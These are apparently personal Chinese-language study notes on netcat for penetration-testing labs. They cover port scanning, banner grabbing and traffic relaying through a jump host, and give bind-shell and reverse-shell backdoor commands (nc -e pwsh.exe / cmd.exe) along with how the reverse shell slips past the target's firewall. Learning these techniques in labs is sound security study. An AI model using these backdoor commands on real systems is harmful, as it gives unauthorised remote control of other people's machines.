# 一、信息收集
## 端口扫描 -- 仅端口状态
```shell
nc [-v -n -z -wI]{可以是**-vnzwI**} <target_ip> <port_range>
```
- -v 表示对错误进行详细输出
- -n 不对目标机器进行DNS解析
- -z zero I/0模式，专用于端口扫描。表示对目标IP发送的数据表中不包含任何[payload]{有效载荷}，这样做可以加快扫描的速度。
- -w1 超时设置为1秒。

> [!attention] 注意
> 端口共有 65535 个
> `22` 表示只监听 22 端口
> `22 23` 表示只监听 22**和**23 端口
> `22-53` 表示监听 22**到**53 端口
## banner 抓取 -- 端口信息
```shell
echo "" | nc -nvw1 <target_ip> <port_range>
 
```
# 二、建立后门--靶机
```shell
# 监听型后门(控制别人)
nc -l -p 2026 -e pwsh.exe

# 连接型后门(被别人控制) 
nc <remote_ip> <remote_post> -e cmd.exe
 
```
> [!note] 笔记
> 1. 监听 : 靶机作为 server, 攻击机可能被靶机的防火墙**拦截**
> 2. 来接 : 靶机作为 client, 靶机**主动**献出权利, 绕过靶机防火墙的限制
# 三、链接转发
## inside
```shell
nc -lp <inside_port>
 
```
## JumpProxy
```shell
nc -l -p <localport> -e delay.bat
 
```
### delay.bat
```shell
nc <inside_ip> <inside_port>
 
```
## outside_host
```shell
nc <JumpProxy> <JumpProxy_port> [>]{**输出**重定向} delay.bat
 
```